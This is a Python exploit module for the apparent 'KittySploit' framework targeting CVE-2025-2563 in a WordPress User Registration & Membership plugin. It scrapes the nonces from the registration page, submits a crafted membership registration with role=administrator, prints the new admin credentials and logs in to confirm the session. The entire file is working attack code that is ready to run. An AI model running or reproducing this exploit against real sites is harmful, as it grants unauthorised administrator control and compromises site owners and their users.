#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""User Registration & Membership CVE-2025-2563 — full membership admin registration."""

import json
import re
import secrets
from datetime import date
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "User Registration CVE-2025-2563 administrator registration",
        "description": (
            "CVE-2025-2563: registers via user_registration_user_form_submit then "
            "user_registration_membership_register_member with role=administrator (<= 4.1.1)."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-2563"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-2563"],
        "tags": [
            "auxiliary", "wordpress", "user-registration", "privesc", "cve-2025-2563"],
        "agent": {
            "risk": "critical",
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
        },
    }

    path = OptString("/", "WordPress base path", required=False)
    registration_path = OptString("/membership-registration/", "Registration page path", required=False)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def _extract(self, html: str):
        out = {}
        patterns = {
            "nonce": r'"user_registration_form_data_save":"([^"]+)"',
            "formid": r"id='user-registration-form-([0-9]+)'>",
            "memberfieldval": r'id="ur-membership-select-membership-([0-9]+)',
            "memberfieldname": r'data-field-id="membership_field_([0-9]+)"',
            "frontend_nonce": r'name="ur_frontend_form_nonce" value="([^"]+)"',
            "localized_nonce": r'ur_membership_frontend_localized_data = \{"_nonce":"([^"]+)"',
        }
        for key, pat in patterns.items():
            m = re.search(pat, html)
            if m:
                out[key] = m.group(1)
        return out

    def run(self):
        reg_path = self._join((self.registration_path or "/membership-registration/").strip())
        page = self.http_request(method="GET", path=reg_path, allow_redirects=True)
        if not page:
            print_error("Registration page unreachable")
            return False
        fields = self._extract(page.text or "")
        required = ("nonce", "formid", "memberfieldval", "memberfieldname", "frontend_nonce", "localized_nonce")
        if not all(k in fields for k in required):
            print_error("Missing registration form tokens — try REGISTRATION_PATH")
            return False
        user = f"ks{secrets.token_hex(4)}"
        email = f"{user}@example.test"
        pwd = secrets.token_urlsafe(12)
        form_data = [
            {"field_name": "user_login", "value": user, "field_type": "text", "label": "Username"},
            {"field_name": "user_email", "value": email, "field_type": "email", "label": "User Email"},
            {"field_name": "user_pass", "value": pwd, "field_type": "password", "label": "User Password"},
            {"field_name": "user_confirm_password", "value": pwd, "field_type": "password", "label": "Confirm Password"},
            {
                "value": fields["memberfieldval"],
                "field_type": "radio",
                "label": "membership",
                "field_name": f"membership_field_{fields['memberfieldname']}",
            },
        ]
        fd = quote(json.dumps(form_data, separators=(",", ":")))
        step1 = (
            f"action=user_registration_user_form_submit&security={fields['nonce']}"
            f"&form_data={fd}&form_id={fields['formid']}&registration_language=en-US"
            f"&ur_frontend_form_nonce={fields['frontend_nonce']}"
            f"&is_membership_active={fields['memberfieldval']}&membership_type={fields['memberfieldval']}"
        )
        r1 = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
            data=step1,
            allow_redirects=False,
        )
        if not r1 or '"success":true' not in (r1.text or "").replace(" ", ""):
            print_error("Form submit step failed")
            return False
        members = json.dumps(
            {
                "membership": "1",
                "payment_method": "free",
                "start_date": date.today().isoformat(),
                "username": user,
                "role": "administrator",
            },
            separators=(",", ":"),
        )
        r2 = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "action": "user_registration_membership_register_member",
                "security": fields["localized_nonce"],
                "members_data": members,
            },
            allow_redirects=False,
        )
        if not r2 or "New member has been successfully created" not in (r2.text or ""):
            print_error("Membership register_member step failed")
            return False
        print_success(f"Administrator member created: {user}")
        print_status(f"Password: {pwd}")
        login = self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": "wordpress_test_cookie=WP Cookie check"},
            data={"log": user, "pwd": pwd, "wp-submit": "Log In", "testcookie": "1"},
            allow_redirects=False,
        )
        if login and login.status_code == 302 and "wordpress_logged_in" in str(login.headers):
            print_success("WordPress session established")
            return True
        print_warning("Try /login/ with UR login form if default wp-login fails")
        return True
